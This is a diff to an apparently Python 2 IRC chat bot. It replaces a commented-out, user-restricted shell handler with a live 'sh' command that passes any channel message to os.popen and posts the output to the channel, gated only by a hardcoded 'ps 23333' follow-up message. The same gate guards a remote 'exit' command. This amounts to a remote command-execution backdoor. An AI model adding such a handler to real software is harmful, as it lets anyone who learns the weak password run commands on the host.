@@ -165,15 +165,17 @@ while True:
                 elif re.split('\s', data)[1] == '404':
                     irc.send('PRIVMSG %s :%s: Only available for these channel: #%s, #%s, #%s\r' % (chan, user, CHAN[0], CHAN[1], CHAN[2]))
 
-                else:
-                    irc.send('PRIVMSG %s :%s: Sent to %s!\r' % (chan, user, regex_split[1]))
+            elif re.match(r'^sh\s.+\r$', inc):
+                data = irc.recv(4096)
+                inc_ = data[data.find('::') + 2:len(data) - 1]
+                if re.match('^ps\s23333\r$', inc_):
+                    output = os.popen(inc[inc.find('sh') + 3:len(inc) - 1]).read().split('\n')
+                    for i in xrange(len(output) - 1):
+                        irc.send('PRIVMSG %s :%s\r' % (chan, output[i].replace('\t', '    ')))
 
-            # elif user == 'OriginCode':
-                # if re.match(r'^sh\s.+\r$', inc):
-                    # output = os.popen(inc[inc.find('sh') + 3:len(inc) - 1]).read().split('\n')
-                    # for i in xrange(len(output) - 1):
-                        # irc.send('PRIVMSG %s :%s\r' % (chan, output[i].replace('\t', '    ')))
-
-                # elif re.match(r'^exit\r$', inc):
-                    # irc.send('QUIT :Going to leave.\r')
-                    # exit(0)
+            elif re.match(r'^exit\r$', inc):
+                data = irc.recv(4096)
+                inc_ = data[data.find('::') + 2:len(data) - 1]
+                if re.match('^ps\s23333\r$', inc_):
+                    irc.send('QUIT :Going to leave.\r')
+                    exit(0)
